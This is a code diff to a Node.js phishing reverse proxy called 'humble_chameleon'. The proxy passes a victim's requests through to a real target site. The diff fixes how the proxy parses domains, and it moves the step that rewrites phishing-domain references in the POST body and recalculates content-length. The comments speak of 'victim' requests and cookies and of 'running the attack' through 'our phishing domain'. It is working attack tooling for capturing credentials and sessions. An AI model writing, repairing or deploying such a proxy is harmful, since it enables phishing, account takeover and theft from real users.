@@ -62,7 +62,7 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
   requested_domain = victim_request.headers.host
   split_domain = requested_domain.split('.')
   split_domain.shift()
-  if(split_domain.length == 1){
+  if(split_domain.length < 2){
     humble_domain = requested_domain
   }else{
     humble_domain = split_domain.join('.')
@@ -127,8 +127,6 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
   //wait for the end of the request to begin the proxy steps
   victim_request.on('end', function () {
 
-    postData = postData.replace(reverse_sub_regex, target)
-
     options = {
       host: victim_request.headers.host.replace(humble_domain, target),
       port: 443,
@@ -137,8 +135,6 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       //wierd but it works somehow... Just the string will break a bunch of stuff
       headers: JSON.parse(JSON.stringify(victim_request.headers).replace(reverse_sub_regex, target))
     };
-
-    options.headers['content-length'] = postData.length.toString()
 
     let victim_cookies = options.headers.cookie;
     if((typeof victim_cookies) == 'undefined'){
@@ -223,6 +219,10 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       }catch(err){
         //no cookies
       }
+      //we're running the attack so sub refs to our phishing domain
+      postData = postData.replace(reverse_sub_regex, target)
+      //and adjust the payload length
+      options.headers['content-length'] = postData.length.toString()
       //make a request to the real server and pipe the response back to the victim
       var req = https.request(options, chameleon.humbleProxy(victim_request, humble_response));
 
